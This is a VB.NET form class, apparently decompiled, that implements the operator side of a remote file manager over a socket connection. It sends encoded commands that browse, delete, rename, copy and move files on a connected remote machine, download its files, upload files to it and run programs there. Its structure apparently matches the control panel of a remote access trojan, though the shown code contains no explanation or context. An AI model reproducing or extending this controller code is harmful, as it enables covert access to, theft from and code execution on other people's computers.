Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Windows.Forms

Public Class FM
    Inherits Form
    ' Methods
    Public Sub New()
        AddHandler MyBase.FormClosing, New FormClosingEventHandler(AddressOf FM_FormClosing)
        AddHandler MyBase.Load, New EventHandler(AddressOf FM_Load)
        AddHandler MyBase.Resize, New EventHandler(AddressOf FM_Resize)
        Images = New Collection
        QQ = ""
        Cache = New Collection
        Dim box As New PictureBox
        Dim size As New Size(160, 120)
        box.Size = size
        box.BackColor = Color.Black
        box.SizeMode = PictureBoxSizeMode.Zoom
        P = box
        folder = ""
        isCut = False
        Flist = ""
        InitializeComponent()
    End Sub

    Public Cache As Collection
    Public Flist As String
    Private folder As String
    Public Images As Collection
    Public isCut As Boolean
    Public osk As Client
    Public P As PictureBox
    Public QQ As String
    Public sk As Client

    Private Sub CopyToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles CopyToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Dim str As String = ""
        Try
            enumerator = L2.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If ((current.Text <> "..") AndAlso (current.SubItems.Item(2).Text <> "DIR")) Then
                    str = (str & ";" & current.ToolTipText)
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        If (str <> "") Then
            Flist = str.Remove(0, 1)
            isCut = False
        End If
    End Sub

    Private Sub CutToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles CutToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Dim str As String = ""
        Try
            enumerator = L2.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If ((current.Text <> "..") AndAlso (current.SubItems.Item(2).Text <> "DIR")) Then
                    str = (str & ";" & current.ToolTipText)
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
        If (str <> "") Then
            Flist = str.Remove(0, 1)
            isCut = True
        End If
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles DeleteToolStripMenuItem.Click
        If (L2.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator = Nothing
            Dim s As String = "dl"
            Try
                enumerator = L2.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    If (current.Text <> "..") Then
                        If (current.SubItems.Item(2).Text = "DIR") Then
                            s = (s & ind.Y & FN.ENB((current.ToolTipText & ";*")))
                        Else
                            s = (s & ind.Y & FN.ENB((current.ToolTipText & ";")))
                        End If
                    End If
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
            sk.Send(s)
        End If
    End Sub

    Private Sub DownloadToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles DownloadToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L2.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If ((current.Text <> "..") AndAlso (current.SubItems.Item(2).Text <> "DIR")) Then
                    Dim strArray As String() = New String(5 - 1) {}
                    strArray(0) = "dw"
                    strArray(1) = ind.Y
                    Dim item2 As ListViewItem = current
                    Dim toolTipText As String = item2.ToolTipText
                    item2.ToolTipText = toolTipText
                    strArray(2) = FN.ENB(toolTipText)
                    strArray(3) = ind.Y
                    strArray(4) = sk.ip
                    sk.Send(String.Concat(strArray))
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub EditToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles EditToolStripMenuItem.Click
        If (L2.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator = Nothing
            Dim s As String = "rd"
            Try
                enumerator = L2.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    If (current.SubItems.Item(2).Text <> "DIR") Then
                        Dim item2 As ListViewItem = current
                        Dim toolTipText As String = item2.ToolTipText
                        item2.ToolTipText = toolTipText
                        s = (s & ind.Y & FN.ENB(toolTipText))
                    End If
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
            sk.Send(s)
        End If
    End Sub

    Public Sub exp(ByVal x As String, Optional ByVal Refresh As Boolean = False)
        Dim pr As New ToolStripProgressBar '= pr
        SyncLock pr
            P.Image = Nothing
            P.Visible = False
            TextBox1.BackColor = Color.IndianRed
            Dim key As String = x.Replace("\\", "\")
            If Not key.EndsWith("\") Then
                key = (key & "\")
            End If
            TextBox1.Text = key
            If (Refresh AndAlso Cache.Contains(key)) Then
                Cache.Remove(key)
            End If
            If Cache.Contains(key) Then
                Dim bar2 As ToolStripProgressBar
                TextBox1.BackColor = Color.Pink
                Dim mcach As FMcach = DirectCast(Cache.Item(key), FMcach)
                pr.Value = 0
                pr.Maximum = (mcach.files.Count + mcach.folders.Count)
                L2.Items.Clear()
                If (Not New DirectoryInfo(key).Parent Is Nothing) Then
                    Dim item As ListViewItem = L2.Items.Add("..", "..", 0)
                    item.SubItems.Add("")
                    item.SubItems.Add("DIR")
                    item.ToolTipText = (New DirectoryInfo(key).Parent.FullName & "\")
                    item = Nothing
                End If
                Dim str2 As String
                For Each str2 In mcach.folders
                    bar2 = pr
                    bar2.Value += 1
                    Dim item2 As ListViewItem = L2.Items.Add(str2, New DirectoryInfo(str2).Name, 0)
                    item2.SubItems.Add("")
                    item2.SubItems.Add("DIR")
                    item2.ToolTipText = str2
                    item2 = Nothing
                Next
                Dim str3 As String
                For Each str3 In mcach.files
                    bar2 = pr
                    bar2.Value += 1
                    Dim strArray As String() = Strings.Split(str3, ";", -1, CompareMethod.Binary)
                    Dim info As New FileInfo(strArray(0))
                    Dim item3 As ListViewItem = L2.Items.Add(info.FullName, info.Name, 1)
                    item3.ToolTipText = info.FullName
                    item3.SubItems.Add(strArray(1))
                    item3.SubItems.Add(strArray(2))
                    If (info.Extension.Length > 0) Then
                        If Not MG2.Images.ContainsKey(info.Extension) Then
                            File.Create((Application.StartupPath & "\!" & info.Extension)).Close()
                            MG2.Images.Add(info.Extension, Icon.ExtractAssociatedIcon((Application.StartupPath & "\!" & info.Extension)))
                            File.Delete((Application.StartupPath & "\!" & info.Extension))
                            item3.ImageKey = info.Extension
                        Else
                            item3.ImageKey = info.Extension
                        End If
                    End If
                    item3 = Nothing
                Next
                L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                pr.Value = 0
            Else
                sk.Send(("!" & ind.Y & FN.ENB(key)))
            End If
        End SyncLock
    End Sub

    Private Sub FM_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs) Handles MyBase.FormClosing
        Try
            P.Dispose()
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
        Try
            Images.Clear()
        Catch exception4 As Exception
            ProjectData.SetProjectError(exception4)
            Dim exception2 As Exception = exception4
            ProjectData.ClearProjectError()
        End Try
        Try
            Cache.Clear()
        Catch exception5 As Exception
            ProjectData.SetProjectError(exception5)
            Dim exception3 As Exception = exception5
            ProjectData.ClearProjectError()
        End Try
        sk.CN = False
    End Sub

    Private Sub FM_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load
        L2.Controls.Add(P)
        P.BringToFront()
        sk.Folder = osk.Folder
        P.Visible = False
        P.BorderStyle = BorderStyle.FixedSingle
        QQ = Conversions.ToString(ind.vno(osk.L))
        Text = QQ
        Try
            folder = (osk.Folder & "Downloads\")
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
        sk.Send("~")
    End Sub

    Private Sub FM_Resize(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Resize
        P.Left = ((L2.Width - P.Width) - &H19)
        P.Top = ((L2.Height - P.Height) - &H19)
    End Sub

    Private Sub L1_DoubleClick(ByVal sender As Object, ByVal e As EventArgs) Handles L1.DoubleClick
        If (L1.SelectedItems.Count <> 0) Then
            exp(L1.SelectedItems.Item(0).ToolTipText, False)
        End If
    End Sub

    Private Sub L2_DoubleClick(ByVal sender As Object, ByVal e As EventArgs) Handles L2.DoubleClick
        If (L2.SelectedItems.Count <> 0) Then
            If (L2.SelectedItems.Item(0).SubItems.Item(2).Text = "DIR") Then
                exp(L2.SelectedItems.Item(0).ToolTipText, False)
            Else
                Dim item As ListViewItem = L2.SelectedItems.Item(0)
                Dim toolTipText As String = item.ToolTipText
                item.ToolTipText = toolTipText
                sk.Send(("rd" & ind.Y & FN.ENB(toolTipText)))
            End If
        End If
    End Sub

    Private Sub L2_SelectedIndexChanged(ByVal sender As Object, ByVal e As EventArgs) Handles L2.SelectedIndexChanged
        P.Image = Nothing
        P.Visible = False
        If (L2.SelectedItems.Count = 1) Then
            Dim item As ListViewItem = L2.SelectedItems.Item(0)
            If Images.Contains(item.ToolTipText) Then
                P.Image = DirectCast(Images.Item(item.ToolTipText), Image)
                P.Visible = True
            ElseIf ".jpg.jpeg.png.ico.bmp.tiff.gif".Contains(item.SubItems.Item(2).Text.ToLower) Then
                Dim item2 As ListViewItem = item
                Dim toolTipText As String = item2.ToolTipText
                item2.ToolTipText = toolTipText
                sk.Send(("#" & ind.Y & FN.ENB(toolTipText)))
            End If
        End If
    End Sub

    Private Sub NewEmptyFileToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles NewEmptyFileToolStripMenuItem.Click
        Dim str As String = Interaction.InputBox("File Name?", "New File", "New Text.txt", -1, -1)
        If (str.Length <> 0) Then
            sk.Send(("nf" & ind.Y & FN.ENB((TextBox1.Text & str))))
        End If
    End Sub

    Private Sub NewFolderToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles NewFolderToolStripMenuItem.Click
        Dim str As String = Interaction.InputBox("Folder Name?", "New Folder", "New Folder", -1, -1)
        If (str.Length <> 0) Then
            sk.Send(("nd" & ind.Y & FN.ENB((TextBox1.Text & str))))
        End If
    End Sub

    Private Sub OpenFolderToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles OpenFolderToolStripMenuItem.Click
        If Not Directory.Exists(folder) Then
            Directory.CreateDirectory(folder)
        End If
        Try
            Process.Start(folder)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub PasteToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles PastToolStripMenuItem.Click
        If (Flist <> "") Then
            If isCut Then
                sk.Send(String.Concat(New String() {"mv", ind.Y, FN.ENB((TextBox1.Text & "\").Replace("\\", "\")), ind.Y, FN.ENB(Flist)}))
            Else
                sk.Send(String.Concat(New String() {"cp", ind.Y, FN.ENB((TextBox1.Text & "\").Replace("\\", "\")), ind.Y, FN.ENB(Flist)}))
            End If
        End If
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles RefreshToolStripMenuItem.Click
        sk.Send("~")
    End Sub

    Private Sub RenameToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles RenameToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L2.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If (current.Text <> "..") Then
                    If (current.SubItems.Item(2).Text = "DIR") Then
                        Dim str As String = Interaction.InputBox("", "Rename", current.Text, -1, -1)
                        If (str.Length > 0) Then
                            sk.Send(("nm" & ind.Y & FN.ENB((current.ToolTipText & ";" & str & ";*"))))
                        End If
                    Else
                        Dim str2 As String = Interaction.InputBox("", "Rename", current.Text, -1, -1)
                        If (str2.Length > 0) Then
                            sk.Send(("nm" & ind.Y & FN.ENB((current.ToolTipText & ";" & str2 & ";"))))
                        End If
                    End If
                End If
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub RunToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles RunToolStripMenuItem.Click
        If (L2.SelectedItems.Count > 0) Then
            Dim enumerator As IEnumerator = Nothing
            Dim s As String = "rn"
            Try
                enumerator = L2.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim item2 As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Dim toolTipText As String = item2.ToolTipText
                    item2.ToolTipText = toolTipText
                    s = (s & ind.Y & FN.ENB(toolTipText))
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
            sk.Send(s)
        End If
    End Sub

    Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Timer1.Tick
        If ((osk Is Nothing) Or (sk Is Nothing)) Then
            Close()
        End If
        If (Not osk.CN Or Not sk.CN) Then
            Close()
        End If
    End Sub

    Private Sub ToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles RefreshToolStripMenuItem1.Click
        If (TextBox1.Text.Length > 0) Then
            exp(TextBox1.Text, True)
        End If
    End Sub

    Private Sub UploadToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles UploadToolStripMenuItem.Click
        If (L2.Items.Count <> 0) Then
            Dim text As String = TextBox1.Text
            Dim dialog As New OpenFileDialog
            dialog.FileName = ""
            If ((dialog.ShowDialog = DialogResult.OK) AndAlso (FileSystem.FileLen(dialog.FileName) <> 0)) Then
                Dim up As New up
                up.TMP = dialog.FileName
                up.FNNN = ([text] & "\" & New FileInfo(dialog.FileName).Name).Replace("\\", "\")
                up.Name = (sk.ip & FN.ENB(up.FNNN))
                up.c = sk
                up.SZ = CInt(FileSystem.FileLen(up.TMP))
                up.Text = (New FileInfo(up.TMP).Name & " >> " & up.FNNN)
                up.Show()
            End If
        End If
    End Sub

    Private Sub UPToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles UPToolStripMenuItem.Click
        If L2.Items.ContainsKey("..") Then
            exp(L2.Items.Item("..").ToolTipText, False)
        End If
    End Sub
End Class